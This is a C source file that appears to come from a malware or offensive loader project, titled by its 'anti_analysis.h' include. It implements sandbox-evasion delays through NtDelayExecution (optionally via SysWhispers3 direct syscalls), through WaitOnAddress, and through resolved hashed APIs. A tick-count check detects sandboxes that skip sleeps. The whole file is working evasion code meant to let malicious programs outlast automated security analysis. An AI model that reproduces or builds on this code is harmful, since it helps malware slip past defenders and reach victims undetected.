#include "anti_analysis.h"
#include <synchapi.h>

#pragma comment(lib, "Synchronization.lib")

extern API_HASHING g_Api;

BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
    // converting minutes to milliseconds
    DWORD dwMilliSeconds = ftMinutes * 60000;
    LARGE_INTEGER DelayInterval = { 0 };
    LONGLONG Delay = NULL;
    NTSTATUS STATUS = NULL;
    DWORD _T0 = NULL, _T1 = NULL;

    DebugPrint("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds\n", (dwMilliSeconds / 1000));

    // converting from milliseconds to the 100-nanosecond - negative time interval
    Delay = dwMilliSeconds * 10000;
    DelayInterval.QuadPart = -Delay;

    _T0 = g_Api.pGetTickCount64();

#ifndef SYSCALL_ENABLED
    // Using Windows API
    Sleep(dwMilliSeconds);
#else
    // Using SysWhispers3
    if ((STATUS = Sw3NtDelayExecution(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
        DebugPrint("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
#endif

    _T1 = g_Api.pGetTickCount64();

    // slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwise it failed
    if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
        return FALSE;

    DebugPrint("[+] DONE \n");

    return TRUE;
}

void DelayExecutionVia_WaitOnAddress(volatile LONG* address, LONG initialValue, DWORD timeoutMillis) {
    // Set the initial value at the address
    *address = initialValue;

    // Wait for the value at the address to change or timeout
    if (WaitOnAddress(address, address, sizeof(LONG), timeoutMillis) == FALSE) {
        DWORD error = GetLastError();

        if (error == ERROR_TIMEOUT) {
            DebugPrint("Timeout occurred, proceeding with execution.\n");
        } else {
            DebugPrint("WaitOnAddress failed with error: %lu\n", error);
        }
    } else {
        DebugPrint("Value at address changed, proceeding with execution.\n");
    }
}
